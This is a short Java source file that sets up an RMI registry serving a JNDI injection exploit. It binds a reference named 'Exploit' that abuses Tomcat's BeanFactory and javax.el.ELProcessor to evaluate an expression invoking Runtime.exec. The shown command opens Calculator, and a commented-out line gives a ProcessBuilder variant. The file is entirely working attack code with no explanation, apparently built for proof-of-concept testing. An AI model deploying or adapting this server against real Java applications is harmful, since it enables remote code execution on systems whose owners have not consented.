package org.example;

import org.apache.naming.ResourceRef;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServerELProcessor {
    public static void lanuchRMIregister(Integer rmi_port) throws Exception {

        System.out.println("Creating RMI Registry, RMI Port:"+rmi_port);
        Registry registry = LocateRegistry.createRegistry(rmi_port);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('open /System/Applications/Calculator.app')\")"));
//        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/usr/bin/open','/System/Applications/Calculator.app']).start()\")"));

        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", referenceWrapper);
        System.out.println(referenceWrapper.getReference());

    }

    public static void main(String[] args) throws Exception {
        lanuchRMIregister(1099);
    }
}
